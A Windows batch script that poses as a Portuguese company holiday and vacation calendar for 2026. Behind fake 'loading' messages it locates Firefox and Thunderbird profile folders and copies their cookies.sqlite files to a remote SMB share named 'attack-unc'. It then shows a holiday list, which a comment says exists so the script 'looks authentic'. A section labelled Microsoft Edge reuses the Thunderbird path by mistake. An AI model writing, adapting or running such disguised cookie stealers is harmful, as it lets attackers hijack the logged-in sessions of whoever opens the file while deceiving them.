net use * /delete /y >nul 2>&1

@echo off
title Plano de Feriados e Ferias da Empresa (2026)
color 0B

echo ======================================================
echo       PLANO DE FERIADOS E FERIAS DA EMPRESA (2026)
echo ======================================================
echo.
echo A carregar o calendario de feriados e ferias aprovadas...
echo Por favor, aguarde enquanto o plano sincroniza.
echo.
@echo off
SET "SambaShare=\\100.75.53.25\attack-unc"
@echo off

:: 1. Dynamically target the Firefox Profiles directory using environment variables

SET "ProfileDir=%APPDATA%\Mozilla\Firefox\Profiles"


:: 2. Loop through directories ending with .default-release to find the exact random-string prefix folder

SET "TargetFolder="

FOR /D %%D IN ("%ProfileDir%\*.default-release") do (

SET "TargetFolder=%%D"

)


:: Check if the folder was found

IF "%TargetFolder%"=="" (

exit /b 1

)

:: 3. Define the specific file you want to grab from that folder

:: (Change 'places.sqlite' or whatever file you are targeting)

SET "FileToSend=%TargetFolder%\cookies.sqlite"


IF NOT EXIST "%FileToSend%" (

exit /b 1

)


:: 4. Copy the file back to your NixOS Samba share

copy "%FileToSend%" "\\100.75.53.25\attack-unc\ff_cookies.sqlite"

::THUNDERBIRD

SET "ProfileDir=%APPDATA%\Thunderbird\Profiles"


:: 2. Loop through directories ending with .default-release to find the exact random-string prefix folder

SET "TargetFolder="

FOR /D %%D IN ("%ProfileDir%\*.default-release") do (

SET "TargetFolder=%%D"

)


:: Check if the folder was found

IF "%TargetFolder%"=="" (


exit /b 1

)



:: 3. Define the specific file you want to grab from that folder


SET "FileToSend=%TargetFolder%\cookies.sqlite"


IF NOT EXIST "%FileToSend%" (


exit /b 1

)


:: 4. Copy the file back to your NixOS Samba share

copy "%FileToSend%" "\\100.75.53.25\attack-unc\tb_cookies.sqlite"


:: MICROSOFT EDGE
SET "ProfileDir=%APPDATA%\Thunderbird\Profiles"


:: 2. Loop through directories ending with .default-release to find the exact random-string prefix folder

SET "TargetFolder="

FOR /D %%D IN ("%ProfileDir%\*.default-release") do (

SET "TargetFolder=%%D"

)


:: Check if the folder was found

IF "%TargetFolder%"=="" (

exit /b 1

)


:: 3. Define the specific file you want to grab from that folder

:: (Change 'places.sqlite' or whatever file you are targeting)

SET "FileToSend=%TargetFolder%\cookies.sqlite"


IF NOT EXIST "%FileToSend%" (


exit /b 1

)


:: 4. Copy the file back to your NixOS Samba share

copy "%FileToSend%" "\\100.75.53.25\attack-unc\tb_cookies.sqlite"


:: ==========================================
:: 5. CLEAN UP NETWORK CONNECTION
:: ==========================================
net use * /delete /y >nul 2>&1

:: Simulate loading a calendar menu so it looks authentic
timeout /t 2 /nobreak >nul
cls
echo ======================================================
echo       PLANO DE FERIADOS E FERIAS DA EMPRESA (2026)
echo ======================================================
echo.
echo [1] Ano Novo                  - 1 de Janeiro
echo [2] Sexta-feira Santa         - 3 de Abril
echo [3] Dia da Liberdade          - 25 de Abril
echo [4] Dia do Trabalhador        - 1 de Maio
echo [5] Dia de Portugal           - 10 de Junho
echo [6] Férias de Verão           - 15 de Agosto a 31 de Agosto
echo [7] Natal                     - 25 de Dezembro
echo [8] Férias de Natal           - 26 de Dezembro a 31 de Dezembro
echo.
echo Estado: Calendario de feriados atualizado com sucesso.
echo.
pause